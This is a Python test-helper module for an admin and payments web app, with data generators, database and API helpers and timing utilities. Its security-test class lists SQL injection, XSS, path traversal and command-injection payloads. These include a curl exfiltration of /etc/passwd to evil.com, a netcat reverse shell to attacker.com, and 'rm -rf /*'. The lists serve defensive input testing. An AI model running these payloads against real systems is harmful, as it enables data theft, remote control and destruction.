"""
Test utilities and helper functions for admin functionality tests
"""

import json
import random
import string
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional, Union
from sqlalchemy.orm import Session
from fastapi.testclient import TestClient
from httpx import AsyncClient

from app.models.user import User, MembershipType, UserStatus
from app.models.credit import CreditTransaction, TransactionType, CreditSource
from app.models.payment import Order, Refund, OrderStatus, PackageType, PaymentMethod
from app.services.auth_service import AuthService


class TestDataGenerator:
    """Utility class for generating test data."""
    
    @staticmethod
    def random_email() -> str:
        """Generate a random email address."""
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        domain = ''.join(random.choices(string.ascii_lowercase, k=5))
        return f"{username}@{domain}.com"
    
    @staticmethod
    def random_string(length: int = 10) -> str:
        """Generate a random string."""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    
    @staticmethod
    def random_user_id() -> str:
        """Generate a random user ID."""
        return f"user_{TestDataGenerator.random_string(12)}"
    
    @staticmethod
    def random_order_id() -> str:
        """Generate a random order ID."""
        return f"order_{TestDataGenerator.random_string(12)}"
    
    @staticmethod
    def random_refund_id() -> str:
        """Generate a random refund ID."""
        return f"refund_{TestDataGenerator.random_string(12)}"
    
    @staticmethod
    def random_transaction_id() -> str:
        """Generate a random transaction ID."""
        return f"txn_{TestDataGenerator.random_string(12)}"
    
    @staticmethod
    def random_password() -> str:
        """Generate a random password."""
        return TestDataGenerator.random_string(12)
    
    @staticmethod
    def random_phone() -> str:
        """Generate a random phone number."""
        return f"+1{random.randint(1000000000, 9999999999)}"
    
    @staticmethod
    def random_amount(min_amount: int = 100, max_amount: int = 10000) -> int:
        """Generate a random amount in cents."""
        return random.randint(min_amount, max_amount)
    
    @staticmethod
    def random_date(days_ago: int = 30) -> datetime:
        """Generate a random date within the last N days."""
        days = random.randint(0, days_ago)
        return datetime.utcnow() - timedelta(days=days)
    
    @staticmethod
    def create_user_data(
        email: Optional[str] = None,
        password: Optional[str] = None,
        nickname: Optional[str] = None,
        is_admin: bool = False,
        status: UserStatus = UserStatus.ACTIVE,
        membership_type: MembershipType = MembershipType.FREE,
        credits: int = 0
    ) -> Dict[str, Any]:
        """Create user data for testing."""
        return {
            "email": email or TestDataGenerator.random_email(),
            "password": password or TestDataGenerator.random_password(),
            "nickname": nickname or TestDataGenerator.random_string(8),
            "is_admin": is_admin,
            "status": status,
            "membership_type": membership_type,
            "credits": credits
        }
    
    @staticmethod
    def create_order_data(
        user_id: int,
        package_type: PackageType = PackageType.CREDITS,
        status: OrderStatus = OrderStatus.PENDING,
        amount: Optional[int] = None
    ) -> Dict[str, Any]:
        """Create order data for testing."""
        final_amount = amount or TestDataGenerator.random_amount()
        return {
            "order_id": TestDataGenerator.random_order_id(),
            "user_id": user_id,
            "package_id": f"pkg_{package_type.value}_{TestDataGenerator.random_string(6)}",
            "package_name": f"Test {package_type.value.title()} Package",
            "package_type": package_type.value,
            "original_amount": final_amount,
            "discount_amount": 0,
            "final_amount": final_amount,
            "payment_method": random.choice([PaymentMethod.STRIPE.value, PaymentMethod.PAYPAL.value]),
            "status": status.value,
            "credits_amount": final_amount if package_type == PackageType.CREDITS else None,
            "membership_duration": 30 if package_type == PackageType.MEMBERSHIP else None,
            "created_at": TestDataGenerator.random_date(),
            "paid_at": TestDataGenerator.random_date() if status == OrderStatus.PAID else None,
            "expires_at": datetime.utcnow() + timedelta(days=30)
        }
    
    @staticmethod
    def create_refund_data(
        order_id: int,
        user_id: int,
        status: str = "processing",
        amount: Optional[int] = None
    ) -> Dict[str, Any]:
        """Create refund data for testing."""
        return {
            "refund_id": TestDataGenerator.random_refund_id(),
            "order_id": order_id,
            "user_id": user_id,
            "amount": amount or TestDataGenerator.random_amount(),
            "reason": TestDataGenerator.random_string(20),
            "status": status,
            "created_at": TestDataGenerator.random_date(),
            "processed_at": TestDataGenerator.random_date() if status != "processing" else None,
            "completed_at": TestDataGenerator.random_date() if status == "completed" else None,
            "admin_notes": TestDataGenerator.random_string(30) if status != "processing" else None
        }
    
    @staticmethod
    def create_transaction_data(
        user_id: int,
        transaction_type: TransactionType = TransactionType.EARN,
        amount: Optional[int] = None
    ) -> Dict[str, Any]:
        """Create transaction data for testing."""
        final_amount = amount or TestDataGenerator.random_amount(10, 1000)
        if transaction_type == TransactionType.SPEND:
            final_amount = -final_amount
            
        return {
            "transaction_id": TestDataGenerator.random_transaction_id(),
            "user_id": user_id,
            "type": transaction_type.value,
            "amount": final_amount,
            "balance_after": TestDataGenerator.random_amount(50, 500),
            "source": random.choice([source.value for source in CreditSource]),
            "description": TestDataGenerator.random_string(25),
            "created_at": TestDataGenerator.random_date()
        }


class DatabaseHelper:
    """Helper class for database operations in tests."""
    
    @staticmethod
    def create_user(
        db: Session,
        user_data: Dict[str, Any],
        auth_service: AuthService
    ) -> User:
        """Create a user in the database."""
        user = User(
            user_id=user_data.get("user_id", TestDataGenerator.random_user_id()),
            email=user_data["email"],
            hashed_password=auth_service.get_password_hash(user_data["password"]),
            nickname=user_data.get("nickname"),
            is_admin=user_data.get("is_admin", False),
            status=user_data.get("status", UserStatus.ACTIVE),
            membership_type=user_data.get("membership_type", MembershipType.FREE),
            credits=user_data.get("credits", 0)
        )
        db.add(user)
        db.commit()
        db.refresh(user)
        return user
    
    @staticmethod
    def create_multiple_users(
        db: Session,
        count: int,
        auth_service: AuthService,
        is_admin: bool = False
    ) -> List[User]:
        """Create multiple users in the database."""
        users = []
        for _ in range(count):
            user_data = TestDataGenerator.create_user_data(is_admin=is_admin)
            user = DatabaseHelper.create_user(db, user_data, auth_service)
            users.append(user)
        return users
    
    @staticmethod
    def create_order(db: Session, order_data: Dict[str, Any]) -> Order:
        """Create an order in the database."""
        order = Order(**order_data)
        db.add(order)
        db.commit()
        db.refresh(order)
        return order
    
    @staticmethod
    def create_refund(db: Session, refund_data: Dict[str, Any]) -> Refund:
        """Create a refund in the database."""
        refund = Refund(**refund_data)
        db.add(refund)
        db.commit()
        db.refresh(refund)
        return refund
    
    @staticmethod
    def create_transaction(db: Session, transaction_data: Dict[str, Any]) -> CreditTransaction:
        """Create a credit transaction in the database."""
        transaction = CreditTransaction(**transaction_data)
        db.add(transaction)
        db.commit()
        db.refresh(transaction)
        return transaction
    
    @staticmethod
    def create_user_with_transactions(
        db: Session,
        user_data: Dict[str, Any],
        auth_service: AuthService,
        transaction_count: int = 3
    ) -> tuple[User, List[CreditTransaction]]:
        """Create a user with associated transactions."""
        user = DatabaseHelper.create_user(db, user_data, auth_service)
        
        transactions = []
        for _ in range(transaction_count):
            txn_data = TestDataGenerator.create_transaction_data(user.id)
            transaction = DatabaseHelper.create_transaction(db, txn_data)
            transactions.append(transaction)
        
        return user, transactions
    
    @staticmethod
    def create_user_with_orders(
        db: Session,
        user_data: Dict[str, Any],
        auth_service: AuthService,
        order_count: int = 2
    ) -> tuple[User, List[Order]]:
        """Create a user with associated orders."""
        user = DatabaseHelper.create_user(db, user_data, auth_service)
        
        orders = []
        for _ in range(order_count):
            order_data = TestDataGenerator.create_order_data(user.id)
            order = DatabaseHelper.create_order(db, order_data)
            orders.append(order)
        
        return user, orders


class ApiHelper:
    """Helper class for API operations in tests."""
    
    @staticmethod
    def login_user(client: TestClient, email: str, password: str) -> Dict[str, Any]:
        """Login a user and return the response data."""
        response = client.post("/api/v1/auth/login", json={
            "email": email,
            "password": password
        })
        assert response.status_code == 200
        return response.json()["data"]
    
    @staticmethod
    def register_user(client: TestClient, user_data: Dict[str, Any]) -> Dict[str, Any]:
        """Register a new user and return the response data."""
        response = client.post("/api/v1/auth/register", json=user_data)
        assert response.status_code == 200
        return response.json()["data"]
    
    @staticmethod
    def create_auth_headers(token: str) -> Dict[str, str]:
        """Create authorization headers with the given token."""
        return {"Authorization": f"Bearer {token}"}
    
    @staticmethod
    def get_admin_token(client: TestClient, email: str = "admin@test.com", password: str = "admin123456") -> str:
        """Get admin authentication token."""
        login_data = ApiHelper.login_user(client, email, password)
        return login_data["accessToken"]
    
    @staticmethod
    def get_user_token(client: TestClient, email: str, password: str) -> str:
        """Get user authentication token."""
        login_data = ApiHelper.login_user(client, email, password)
        return login_data["accessToken"]
    
    @staticmethod
    def assert_success_response(response_data: Dict[str, Any]) -> None:
        """Assert that response has the standard success format."""
        assert response_data.get("success") is True
        assert "data" in response_data
        assert "message" in response_data
        assert "timestamp" in response_data
    
    @staticmethod
    def assert_error_response(response_data: Dict[str, Any], expected_message: Optional[str] = None) -> None:
        """Assert that response has the standard error format."""
        assert response_data.get("success") is False
        assert "message" in response_data
        if expected_message:
            assert expected_message in response_data["message"]
    
    @staticmethod
    def assert_pagination_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains valid pagination data."""
        assert "pagination" in response_data
        pagination = response_data["pagination"]
        assert "page" in pagination
        assert "limit" in pagination
        assert "total" in pagination
        assert "total_pages" in pagination
        assert isinstance(pagination["page"], int)
        assert isinstance(pagination["limit"], int)
        assert isinstance(pagination["total"], int)
        assert isinstance(pagination["total_pages"], int)
    
    @staticmethod
    def assert_admin_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains admin session data."""
        assert response_data.get("is_admin") is True
        assert response_data.get("admin_session") is True
    
    @staticmethod
    def assert_user_response(response_data: Dict[str, Any]) -> None:
        """Assert that response contains user session data."""
        assert response_data.get("is_admin") is False
        assert response_data.get("admin_session") is False


class SecurityTestHelper:
    """Helper class for security testing."""
    
    @staticmethod
    def test_sql_injection_payloads() -> List[str]:
        """Return common SQL injection payloads for testing."""
        return [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 'x'='x'--",
            "' OR 'x'='x'/*",
            "') OR ('1'='1",
            "') OR ('1'='1'--",
            "') OR ('1'='1'/*",
            "'; DROP TABLE users; --",
            "'; DROP TABLE users; /*",
            "' UNION SELECT * FROM users --",
            "' UNION SELECT * FROM users /*"
        ]
    
    @staticmethod
    def test_xss_payloads() -> List[str]:
        """Return common XSS payloads for testing."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>"
        ]
    
    @staticmethod
    def test_path_traversal_payloads() -> List[str]:
        """Return common path traversal payloads for testing."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....\\\\....\\\\....\\\\windows\\\\system32\\\\config\\\\sam",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam"
        ]
    
    @staticmethod
    def test_command_injection_payloads() -> List[str]:
        """Return common command injection payloads for testing."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "& echo 'Command Injection'",
            "`whoami`",
            "$(id)",
            "; curl http://evil.com/steal?data=$(cat /etc/passwd)",
            "| nc attacker.com 4444 -e /bin/sh",
            "; rm -rf /*",
            "& ping -c 10 127.0.0.1"
        ]


class PerformanceTestHelper:
    """Helper class for performance testing."""
    
    @staticmethod
    def measure_response_time(client: TestClient, method: str, url: str, **kwargs) -> tuple[float, Any]:
        """Measure the response time of an API call."""
        import time
        start_time = time.time()
        
        if method.upper() == "GET":
            response = client.get(url, **kwargs)
        elif method.upper() == "POST":
            response = client.post(url, **kwargs)
        elif method.upper() == "PUT":
            response = client.put(url, **kwargs)
        elif method.upper() == "DELETE":
            response = client.delete(url, **kwargs)
        else:
            raise ValueError(f"Unsupported HTTP method: {method}")
        
        end_time = time.time()
        response_time = end_time - start_time
        
        return response_time, response
    
    @staticmethod
    def generate_load_test_data(count: int) -> List[Dict[str, Any]]:
        """Generate data for load testing."""
        return [TestDataGenerator.create_user_data() for _ in range(count)]